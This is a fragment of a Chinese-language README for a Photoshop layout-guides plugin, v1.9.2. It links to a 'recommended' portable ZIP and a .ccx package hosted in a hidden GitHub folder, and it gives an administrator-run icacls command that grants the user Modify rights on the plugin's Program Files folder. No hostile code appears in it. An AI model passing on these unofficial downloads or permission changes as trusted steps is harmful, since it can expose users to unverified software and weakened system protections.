...
当前版本 **v1.9.2** · 需要 Photoshop 27.0.0（2026）及以上

- [**下载免安装版 ZIP（推荐）**](https://github.com/BUYAOJIAOWOSHUNSHUN/PS-LayoutGuides-Releases/raw/main/.download/PS-LayoutGuides-v1.9.2-portable.zip)
  —— 解压后把整个文件夹放进 Photoshop 的 `Plug-ins` 目录，重启即可，不用安装。
- [下载安装包 .ccx](https://github.com/BUYAOJIAOWOSHUNSHUN/PS-LayoutGuides-Releases/raw/main/.download/PS-LayoutGuides-v1.9.2.ccx)
...
- 给插件文件夹单独授权（管理员执行一次，之后一直有效）：
  ```
  icacls "C:\Program Files\Adobe\Adobe Photoshop 2026\Plug-ins\品牌版式标准规范PS插件-v1.9.2" /grant "%USERNAME%:(OI)(CI)M" /T
  ```
